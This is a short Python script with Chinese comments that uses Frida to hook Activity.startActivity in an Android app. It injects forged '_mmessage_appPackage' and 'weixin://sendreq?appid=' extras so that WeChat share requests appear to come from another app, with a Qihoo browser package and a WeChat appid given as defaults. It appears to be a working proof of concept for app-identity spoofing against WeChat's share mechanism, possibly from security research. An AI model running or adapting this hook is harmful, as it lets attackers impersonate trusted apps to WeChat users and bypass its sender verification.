import frida  #导入frida模块
import sys   
import os

def on_message(message,data): #js中执行send函数后要回调的函数
    print(message)

#得到设备并劫持进程com.example.testfrida（开始用get_usb_device函数用来获取设备，但是一直报错找不到设备，改用get_remote_device函数即可解决这个问题）
process = frida.get_usb_device().attach("com.example.ShareSecurity") 
packagename = "com.qihoo.browser"
appid = "wx60d9d5c44ca9386e"

jscode = """Java.perform(function(){ 
    var ShareActivity = Java.use('android.app.Activity'); 
    ShareActivity.startActivity.overload("android.content.Intent").implementation = function(args){ 
        args.putExtra("_mmessage_appPackage","%s")
        args.putExtra("_mmessage_content","weixin://sendreq?appid=%s")
        args = this.startActivity(args)
    }
});
""" % (sys.argv[1],sys.argv[2])

#创建js脚本
script = process.create_script(jscode)
#加载回调函数，也就是js中执行send函数规定要执行的python函数
script.on('message',on_message) 
#加载脚本
script.load()
sys.stdin.read()